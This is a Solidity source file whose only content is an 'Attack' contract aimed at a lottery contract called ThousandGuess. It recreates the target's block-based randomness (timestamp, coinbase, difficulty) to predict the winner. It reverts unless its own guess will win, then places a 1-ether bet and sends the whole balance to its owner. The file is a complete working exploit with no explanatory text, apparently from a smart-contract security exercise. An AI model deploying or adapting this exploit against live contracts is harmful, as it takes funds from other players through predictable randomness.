// Author: Sierra Kennedy
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/Strings.sol";
import "./ThousandGuess.sol";


contract Attack {

    address public owner;
    ThousandGuess game;
    uint256 constant maxGuess = 1000000;
    uint256 numGuess;

    event Won(uint256 amount, uint256 index);

    constructor() {
        owner = msg.sender;
    }


    function attack(address target, bytes32 curhash, uint256 arraySize, uint attackerInd) public payable returns(uint256){
        // initialize game
        game = ThousandGuess(target);
        numGuess = game.getNum();

        if(numGuess != arraySize - 1) {
            revert("Not time to place bet yet");
        }

        // calculate current hash and index of winner
        curhash = sha256(abi.encodePacked(block.timestamp, block.coinbase, block.difficulty, curhash));
        uint256 lotteryNum = (uint256(curhash) + block.timestamp) % (maxGuess + 1);
        uint256 i = lotteryNum % arraySize;

        // checks if last guess is winner
        if(attackerInd != i) {
            revert(Strings.toString(i));
        }

        // calls make guess from game
        (bool success, ) = target.call{value: 1 ether}(abi.encodeWithSignature("addGuess()"));
        if (!success) {
            revert("Call failed");
        }
        emit Won(address(this).balance, i);
        payable(owner).transfer(address(this).balance);
        return(i);
    }

}